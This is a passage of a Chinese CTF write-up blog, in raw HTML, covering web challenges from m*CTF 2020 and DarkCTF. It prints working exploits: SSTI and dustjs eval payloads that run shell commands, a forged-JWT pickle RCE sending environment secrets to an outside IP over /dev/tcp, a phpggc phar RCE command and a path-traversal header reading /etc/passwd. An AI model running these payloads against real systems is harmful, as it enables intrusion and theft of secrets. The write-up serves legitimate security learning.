class="built_in">time</span>(&#123;</span><br><span class="line">            year = utct[<span class="number">1</span>],</span><br><span class="line">            month = utct[<span class="number">2</span>],</span><br><span class="line">            day = utct[<span class="number">3</span>],</span><br><span class="line">            hour = utct[<span class="number">4</span>],</span><br><span class="line">            <span class="built_in">min</span> = utct[<span class="number">5</span>],</span><br><span class="line">            sec = utct[<span class="number">6</span>]</span><br><span class="line">          &#125;)</span><br><span class="line">          <span class="keyword">if</span> listener ~= <span class="literal">nil</span> <span class="keyword">and</span> <span class="built_in">os</span>.<span class="built_in">time</span>() - updatetime &gt;= <span class="number">104</span> <span class="keyword">then</span></span><br><span class="line">            listener.count = listener.count + <span class="number">1</span></span><br><span class="line">            listener:update(<span class="string">"count"</span>)</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">return</span> &#123;</span><br><span class="line">            json = &#123;</span><br><span class="line">              <span class="built_in">status</span> = <span class="string">"success"</span>,</span><br><span class="line">              id = self.session.id,</span><br><span class="line">              timestamp = listener.updated_at,</span><br><span class="line">              count = listener.count,</span><br><span class="line">              updatetime = updatetime,</span><br><span class="line">              currenttime = <span class="built_in">os</span>.<span class="built_in">time</span>(),</span><br><span class="line">              flag = data</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          redirect_to = <span class="string">"/"</span></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>这里单独看下update路由的规则。不难发现只有count&gt;=3470时会与websocket通信。此时服务端会返回一些内容。其中应该就是真正的flag了。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> listener.count &gt;= <span class="number">3470</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> ws = w.new_from_uri(<span class="string">"ws://localhost:8181"</span>)</span><br><span class="line">    <span class="built_in">assert</span>(ws:connect())</span><br><span class="line">    data = &#123;</span><br><span class="line">        user = self.session.id,</span><br><span class="line">        count = listener.count</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">assert</span>(ws:send(cjson.encode(data)))</span><br><span class="line">    data = cjson.decode(<span class="built_in">assert</span>(ws:receive()))</span><br><span class="line">    <span class="built_in">assert</span>(ws:<span class="built_in">close</span>())</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>然后就没有然后了。。。我以为不可能让选手跟websocket通信就跑去看lua有没有什么其他方法修改时间参数。结果就掉进了rabbithole.知道能通信的话，解决方法就很简单了<br>因为有源码所以在自己服务器搭建了复现下。<br>这个题还有非常脑洞的地方。它返回的结果是用flag与你的名字进行异或。所以我们传递足够长的名字并且与之异或还原flag.<br>官方脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">()</span>:</span></span><br><span class="line">    uri = <span class="string">"ws://xxx:8181"</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(uri) <span class="keyword">as</span> websocket:</span><br><span class="line">        name = <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line">        data = &#123;<span class="string">"user"</span>: name, <span class="string">"count"</span>: <span class="number">3500</span>&#125;</span><br><span class="line">        <span class="keyword">await</span> websocket.send(json.dumps(data))</span><br><span class="line">        resp = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> resp:</span><br><span class="line">            print(chr(ord(r) ^ ord(<span class="string">'A'</span>)), end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(solve())</span><br></pre></td></tr></table></figure><p>web题目就这么多。整体上比较简单。最后一个有点脑洞.不过顺带着看了下lua感觉还是蛮有意思的。写web应用的思路有点接近nodejs.</p><h2 id="m-ctf2020"><a href="#m-ctf2020" class="headerlink" title="m*ctf2020"></a>m*ctf2020</h2><p>这个比赛去看时已经只剩2小时了。然后tg群里全是毛子，看不懂讲什么……只能看看gitlab上一些题目的思路了。<br>题目质量不错然后莫名的很对胃口。就是时间太紧加上tcl都没做出来2333.有一个专门的序列化分类。非常有意思。</p><h3 id="Web-wiki"><a href="#Web-wiki" class="headerlink" title="Web-wiki"></a>Web-wiki</h3><p>题目开始只能明确的是xff似乎会在首页渲染，加上是python不难想到ssti.但是更改xff访问会发现我们并不能控制渲染的内容。那么说明可能需要源码了。<br>存在一个路径穿越获取源码。其实这也算python比较经典的漏洞了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/index/&lt;path:dir&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfile</span><span class="params">(dir)</span>:</span></span><br><span class="line">    check_dir = Disabled(str(dir))</span><br><span class="line">    xff = str(request.headers.getlist(<span class="string">'X-Forwarded-For'</span>)[<span class="number">0</span>]).split(<span class="string">','</span>)[<span class="number">1</span>]</span><br><span class="line">    check_xff = Disabled(xff)</span><br><span class="line">    <span class="keyword">if</span> (check_xff.abort_rq()):</span><br><span class="line">        xff = str(request.headers.getlist(<span class="string">'X-Forwarded-For'</span>)[<span class="number">0</span>]).split(<span class="string">','</span>)[len(xff)<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (check_dir.check_blocked()):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(os.path.join(<span class="string">'/app/static'</span>, dir), <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">                data = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> PermissionError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(my_template(xff.replace(<span class="string">'.'</span>, <span class="string">''</span>)))</span><br></pre></td></tr></table></figure><p>可以看到确实可以xff达成ssti.不过需要取<code>,</code>后的内容为可控点。然后不能包含<code>.</code><br>那就很简单了。用attr一条继承链或者直接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request[<span class="string">'application'</span>][<span class="string">'__globals__'</span>][<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>)[<span class="string">'popen'</span>](<span class="string">'env'</span>)[<span class="string">'read'</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">'http://web-library.mctf.online/index/'</span></span><br><span class="line">proxies=&#123;<span class="string">'http'</span>:<span class="string">'127.0.0.1:1080'</span>,<span class="string">'https'</span>:<span class="string">'127.0.0.1:1080'</span>&#125;</span><br><span class="line">payload=<span class="string">"""&#123;&#123;request['application']['__globals__']['__builtins__']['__import__']('os')["popen"]("env")["read"]()&#125;&#125;"""</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'X-Forwarded-For'</span>:<span class="string">'123 ,'</span>+payload</span><br><span class="line">&#125;</span><br><span class="line">r=requests.get(url,headers=headers,proxies=proxies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p><code>FLAG=MCTF{IS_IT_NOT_SO_SECURE_?}</code></p><h3 id="DeadJournal"><a href="#DeadJournal" class="headerlink" title="DeadJournal"></a>DeadJournal</h3><p>序列化分类的python序列化</p><p>登录会发现cookie是jwt形式的。而其中payload的一个值identity明显是pickle序列化后base64的结果。</p><p>那么需要key来伪造pickle序列化数值进行rce<br>爆破得到<code>SecreT</code><br>(我绝对不会再用到c-jwt-cracker爆破key了，效果奇差。手写python + rockyou.txt 效果好了不知道多少倍)</p><p>因为禁止了os.system 以及eval这样的函数。所以用subprocess.checkoutput即可</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span>  b64encode</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        cmd = [<span class="string">'bash'</span>, <span class="string">'-c'</span>, <span class="string">'echo $(env) &gt; /dev/tcp/120.27.246.202/9001 '</span>]</span><br><span class="line">        <span class="keyword">return</span> __import__(<span class="string">'subprocess'</span>).check_output, (cmd,)</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">poc = b64encode(pickle.dumps(e)).decode()</span><br><span class="line">token=<span class="string">'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDE4MTE3NjQsIm5iZiI6MTYwMTgxMTc2NCwianRpIjoiOWU3YzYzOWYtZWVkZC00MzAxLWJkN2EtMmQ4ZDQxYWFjNTA0IiwiZXhwIjoxNjMzMzQ3NzY0LCJpZGVudGl0eSI6ImdBU1ZXZ0VBQUFBQUFBQ01EbkJyYkY5aGNIQXViVzlrWld4emxJd0VWWE5sY3BTVGxDbUJsSDJVS0l3U1gzTmhYMmx1YzNSaGJtTmxYM04wWVhSbGxJd1VjM0ZzWVd4amFHVnRlUzV2Y20wdWMzUmhkR1dVakExSmJuTjBZVzVqWlZOMFlYUmxsSk9VS1lHVWZaUW9qQWhwYm5OMFlXNWpaWlJvQTR3UFkyOXRiV2wwZEdWa1gzTjBZWFJsbEgyVWpBTnJaWG1VYUFKTHFvV1VUb2VVakF4c2IyRmtYMjl3ZEdsdmJuT1VqNVNNQm1Oc1lYTnpYNVJvQW93U1pYaHdhWEpsWkY5aGRIUnlhV0oxZEdWemxJK1VqQWxzYjJGa1gzQmhkR2lVWFpSb0FrNkdsR0dNQjIxaGJtRm5aWEtVakI1emNXeGhiR05vWlcxNUxtOXliUzVwYm5OMGNuVnRaVzUwWVhScGIyNlVqQkZmVTJWeWFXRnNhWHBsVFdGdVlXZGxjcFNUbENtQmxIMlVhQk5vQW5OaWRXS01DSEJoYzNOM2IzSmtsSXdETVRJemxJd0lkWE5sY201aGJXV1VqQWhoWkcxcGJqRXlNNVNNQW1sa2xFdXFkV0l1IiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.VBMiDwfU0EEaEIkq5GMH60THzvCb7QTWPEm-euvTQKs'</span></span><br><span class="line">key=<span class="string">'SecreT'</span></span><br><span class="line">data=jwt.decode(token,verify=<span class="literal">None</span>)</span><br><span class="line">data[<span class="string">'identity'</span>]=poc</span><br><span class="line">token=jwt.encode(data,key=key,algorithm=<span class="string">'HS256'</span>).decode()</span><br><span class="line">print(token)</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">'http://dead-journal.mctf.online/'</span>,cookies=&#123;<span class="string">'access_token_cookie'</span>:token&#125;)</span><br></pre></td></tr></table></figure><p>flag在环境变量<br><code>FLAG=MCTF{pl33Z_donT_u53_p1cKl13}</code></p><h3 id="2in1"><a href="#2in1" class="headerlink" title="2in1"></a>2in1</h3><p>序列化分类的php反序列化</p><p>比较符合实战的题目。有两种文件上传方式。其中一个是直接上传。还有一种应该是<code>file_get_contents</code>上传.这个环境是laravel，而且可以推测上传路径。加上只有jpeg的限制，那么就能够上传phar并进行触发达成rce.</p><p>phpggc真好用。。。直接生成rce的phar-&gt;jpeg文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -pj src_public_uploads_test.jpeg  -o  exp.jpeg Laravel/RCE1  system env</span><br></pre></td></tr></table></figure><p>然后<br><code>phar:///app/public/uploads/YWGXnnP49J.jpeg</code><br>触发<br><img src="/2020/10/05/bootcamp-2020&mctf-2020/0.PNG" alt><br><code>flag=mctf{better_than_w@r}</code></p><h3 id="Chat"><a href="#Chat" class="headerlink" title="Chat"></a>Chat</h3><p>序列化分类的java反序列化<br>首先给出服务端的依赖以及一个jar包。应该是jdk11的环境。不过只是一个thin client.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    implementation <span class="string">'org.springframework.boot:spring-boot-starter-websocket'</span></span><br><span class="line">    compile group: <span class="string">'com.esotericsoftware'</span>, name: <span class="string">'kryo'</span>, version: <span class="string">'4.0.2'</span></span><br><span class="line">    compile group: <span class="string">'org.apache.xbean'</span>, name: <span class="string">'xbean-naming'</span>, version: <span class="string">'4.17'</span></span><br><span class="line">    compileOnly <span class="string">'org.projectlombok:lombok'</span></span><br><span class="line">    annotationProcessor <span class="string">'org.projectlombok:lombok'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接走到关键点找writeObject<br><img src="/2020/10/05/bootcamp-2020&mctf-2020/1.PNG" alt></p><p>然后就大致可以确认是kyro反序列化了。具体利用方法主要是marshalsec + Xbean依赖生成一个payloadfile.然后用类似jndi的方法加载恶意class抛出Error.在error中反序列化ChatMessage类<br>不过因为没有指定类以及一些细节问题。还需要重新编译marshalsec.具体参考<br><a href="https://gitlab.com/mctf/quals-2020/chat/-/blob/master/exploit/marshalsec.patch" target="_blank" rel="noopener">https://gitlab.com/mctf/quals-2020/chat/-/blob/master/exploit/marshalsec.patch</a><br>加上一个写有静态方法抛出读文件payload的class即可达成rce.<br>整体上我还是有很多问题……不过既然源码都有了的话以后接触到kyro反序列化再回来填坑。</p><h3 id="rails"><a href="#rails" class="headerlink" title="rails"></a>rails</h3><p>反序列化类的ruby反序列化<br>基本上就是可以用这个直接打。不过因为要求ruby版本2.5.1就没在本机上打。基本流程是两个cve打组合拳。<br>首先CVE-2019-5418是一个路径穿越的洞。可以在header中设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#123;&#123;</span><br></pre></td></tr></table></figure><p>穿越路径访问到文件。<br>然后可以任意读了后就能读到反序列化的配置文件credentials.yml.enc ,master.key.计算出secret_key_base 后就能访问指定资源进行反序列化rce.CVE-2019-5420<br><a href="https://github.com/mpgn/Rails-doubletap-RCE" target="_blank" rel="noopener">https://github.com/mpgn/Rails-doubletap-RCE</a></p><p>最后还是决定docker起了个2.5.1的环境……然后用这个exp时先bundle install (换源) + 安装nodejs + 去掉exploit.rb里的代理即可运行并反弹shell<br><img src="/2020/10/05/bootcamp-2020&mctf-2020/2.PNG" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  假期就这么在刷题中度过了,但感觉还是很空虚。最近又不知道学什么好，但是偏偏遇到的就是不会……tcltcl.啥时候能学好php跟java啊</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DarkCTF-WEB</title>
      <link href="2020/09/25/DarkCTF-WEB/"/>
      <url>2020/09/25/DarkCTF-WEB/</url>
      
        <content type="html"><![CDATA[<p>好久没发新文章了。正好国庆就要到了，加上还有巅峰极客跟国赛要打。所以周五晚上练手了DarkCTF的题目，稍微花了几小时ak掉当时放出的web。其中大部分都比较简单，其中一道拿了二血的nodejs题目有点意思打算稍微记录下。</p><a id="more"></a><h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><p>给了源码跟网页，主体上就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$web = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line"><span class="keyword">if</span> (is_numeric($web))&#123;</span><br><span class="line">      <span class="keyword">if</span> (strlen($web) &lt; <span class="number">4</span>)&#123;</span><br><span class="line">          <span class="keyword">if</span> ($web &gt; <span class="number">10000</span>)&#123;</span><br><span class="line">                 <span class="keyword">echo</span> (<span class="string">'&lt;div class="w3-panel w3-green"&gt;&lt;h3&gt;Correct&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;p&gt;darkCTF&#123;&#125;&lt;/p&gt;&lt;/div&gt;'</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 <span class="keyword">echo</span> (<span class="string">'&lt;div class="w3-panel w3-red"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;p&gt;Ohhhhh!!! Very Close  &lt;/p&gt;&lt;/div&gt;'</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="keyword">echo</span> (<span class="string">'&lt;div class="w3-panel w3-red"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;p&gt;Nice!!! Near But Far&lt;/p&gt;&lt;/div&gt;'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">'&lt;div class="w3-panel w3-red"&gt;&lt;h3&gt;Wrong!&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;p&gt;Ahhhhh!!! Try Not Easy&lt;/p&gt;&lt;/div&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>取UserAgent作为参数，判断了字符串长度与数值大小。简单使用科学计数法<code>9E9</code>即可绕过</p><h2 id="Apache-Logs"><a href="#Apache-Logs" class="headerlink" title="Apache Logs"></a>Apache Logs</h2><p>给了个zip然后让你从里面的log文件里找flag.简单提取出其中String.fromCharCode部分放到浏览器console里转一下即可。不过提交时要用<code>darkCTF</code>而不是<code>DarkCTF</code></p><h2 id="So-Simple"><a href="#So-Simple" class="headerlink" title="So_Simple"></a>So_Simple</h2><p>开始没啥头绪。后来发现提示了传参id.于是很简单就能发现是个sql注入。甚至基本上就是sqli-labs的第一关。union注入从users表中的password里找到某个flag.</p><h2 id="Simple-SQL"><a href="#Simple-SQL" class="headerlink" title="Simple_SQL"></a>Simple_SQL</h2><p>直接提示传参id.<br>普通布尔盲注。没啥说的。</p><h2 id="Dusty-Notes"><a href="#Dusty-Notes" class="headerlink" title="Dusty Notes"></a>Dusty Notes</h2><p><img src="/2020/09/25/DarkCTF-WEB/0.PNG" alt><br>这题花了一些时间。不过做出来时拿了二血还是挺舒服的。看到Defenit是一血不知道是不是又被posix师傅秒掉了。（posix nodejs 永远的神）</p><p>首先题目是黑盒测试的。这点对于一个nodejs题目来说增加了不少难度。如果是我出这题可能就直接给源码了。但是做完后我感觉这种设计还是很贴近现实的。也给了我一定程度上黑盒测nodejs的手段。</p><p>首先题目大致实现了一个note功能。可以通过<code>addNotes</code>路由传参message。通过<code>deleteNote/{id}</code>来删除note.<br><img src="/2020/09/25/DarkCTF-WEB/1.PNG" alt><br>不过简单看了下cookie发现内容可以由cookie控制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;note</span><br><span class="line">j:[&#123;&quot;id&quot;:1,&quot;body&quot;:&quot;Hack this&quot;&#125;,&#123;&quot;id&quot;:2,&quot;body&quot;:&quot;1&quot;&#125;]</span><br></pre></td></tr></table></figure><p>到这一步为止我有几种思路<br>1.nodejs反序列化。<br>2.原型链污染<br>3.？？？</p><p>首先想到nodejs反序列化是因为以前NahamconCTF解出的一道node题。也是黑盒。然后只有20多解。但是我当时是抱着试一试的心态尝试了下反序列化居然成功拿到shell.后来发现，之所以会有这种想法就是因为:<br><strong>数据为json串。数据由cookie控制</strong><br>序列化输出的结果就是json串,所以黑盒下尝试node-serialize未尝不可。当然本题自然是失败了。因此方法也不再多说。</p><p>第二种想法自然是因为nodejs中想要出现原型链污染实在是太容易了。不过有一说一一道以原型链污染为漏洞的ctf题使用公共靶机是非常不妥的，并且一般是给出源码进行测试。加上此处并没有什么显眼的模板使用比如ejs。因此是原型链污染的可能性也不大。</p><p>此时基本上常规的思路已经走不通了。但是我简单fuzz了一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addNotes?note[]&#x3D;1</span><br><span class="line">addNotes?note[toString]&#x3D;1</span><br></pre></td></tr></table></figure><p>发现它是没有做只能传字符串的限制的。一般来说，不对参数类型做限制时，我们可以传入数组或对象。因此在传入对象时这里会触发报错。<br>然后重点就来了，触发的报错内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;stack&quot;:&quot;TypeError: Cannot convert object to primitive value\n    at Tap.head (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:121:25)\n    at Tap.go (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:812:19)\n    at Chunk.write (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:556:19)\n    at Chunk.reference (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:611:19)\n    at body_4 (evalmachine.&lt;anonymous&gt;:1:1634)\n    at Chunk.render (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:598:12)\n    at Object.tap (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:123:8)\n    at Object.if (&#x2F;app&#x2F;node_modules&#x2F;dustjs-helpers&#x2F;lib&#x2F;dust-helpers.js:213:27)\n    at Chunk.helper (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:769:34)\n    at body_1 (evalmachine.&lt;anonymous&gt;:1:972)\n    at Chunk.section (&#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:654:21)\n    at body_0 (evalmachine.&lt;anonymous&gt;:1:847)\n    at &#x2F;app&#x2F;node_modules&#x2F;dustjs-linkedin&#x2F;lib&#x2F;dust.js:122:11\n    at processTicksAndRejections (internal&#x2F;process&#x2F;task_queues.js:79:11)&quot;,&quot;message&quot;:&quot;Cannot convert object to primitive value&quot;&#125;</span><br></pre></td></tr></table></figure><p>爆出了当前路径<code>/app</code>以及一个依赖<code>dustjs-linkedin/lib/dust.js</code><br>(这里多嘴一句，这里一开始defenit拿到一血后长达4个多小时都没有其他解，并且当时触发报错时题目只会爆500而不是像上面这样打印报错traceback,后来改了题才有了这个报错栈)</p><p>看到这个<code>dust</code>加上题目名中的dust，去搜索一波的话不难发现存在一个漏洞<br>并且有文章在实战中遇到解决<br><a href="https://artsploit.blogspot.com/2016/08/pprce2.html" target="_blank" rel="noopener">https://artsploit.blogspot.com/2016/08/pprce2.html</a></p><p>简单说就是，dust的模板会进入一个if语句执行<code>eval</code>。但是如果我们直接传入参数时它会把敏感字符做处理，而如果传入数组时则不会处理敏感字符，即可rce。</p><p>再多嘴一句，到确定是dust的洞这一步我本来以为弹个shell就完事了。结果测了好久发现不知道是不通外网还是没能执行。差点以为找错洞了。直到他改了题才发现dust依赖确认没找错洞，专心测下去的。<br>当然没有报错我们也有几种办法确认此处存在dust的eval漏洞<br>比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addNotes?message&#x3D;aaa%5C</span><br></pre></td></tr></table></figure><p>会导致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;&#39;xxx\&#39; &#x3D;&#x3D; &#39;desktop&#39;&quot;);</span><br></pre></td></tr></table></figure><p>触发报错<br>再比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addNotes?message[]&#x3D;&amp;message[]&#x3D;y%27-console.log(7)</span><br></pre></td></tr></table></figure><p>也会报错。因为我们此时引号没有被转义直接送入eval.触发报错。<br>所以，如果有着良好的FUZZ手段，黑盒也可以fuzz出问题并确认依赖错误。</p><p>最后，我们使用eval语句命令执行。当然因为不通外网没有回显所以非常狗。我最后选择把结果写静态文件。并且这里静态目录是猜了一手<code>public</code>。所以可以直接写<code>/proc/self/cwd/public/css/style.css</code>或者在爆出是app目录后直接写<code>/app/public/css</code><br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">"http://dusty.darkarmy.xyz/"</span></span><br><span class="line">data=<span class="string">"""j:[&#123;"id":1,"body": ["1","1'-console.log(require('child_process').exec('cat /flag.txt &gt; /app/public/css/style.css').toString());//"]&#125;]"""</span></span><br><span class="line">print(quote(data))</span><br><span class="line">r=requests.get(url,cookies=&#123;<span class="string">'note'</span>:quote(data)&#125;)</span><br><span class="line">print(r.text)</span><br><span class="line">r=requests.get(url+<span class="string">'css/style.css'</span>)</span><br><span class="line">print(r.text)</span><br><span class="line">data=<span class="string">"""j:[&#123;"id":1,"body": ["1","1'-console.log(require('child_process').exec('rm /app/public/css/style.css').toString());//"]&#125;]"""</span></span><br><span class="line">print(quote(data))</span><br><span class="line">r=requests.get(url,cookies=&#123;<span class="string">'note'</span>:quote(data)&#125;)</span><br></pre></td></tr></table></figure><p>cookie可控所有内容上面说过了。只不过测试时因为路由好用就没控cookie.</p><p>做出来后问了下出题人果然不是预期。当然这里我不太确定预期是啥，不过差的应该不多。当然聊完后出题人顺手修了下写文件的权限 :）<br>然后就是这种做法我自己也不是很喜欢。自己出过的nodejs题目在可以rce的情况下我都把工作目录按root权限设置。就是为了防止写文件。不过一般会配置了防止时间盲注，所以都会给出rce的回显</p><p>所以这里猜一手本题预期的方法是time-based-rce:<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 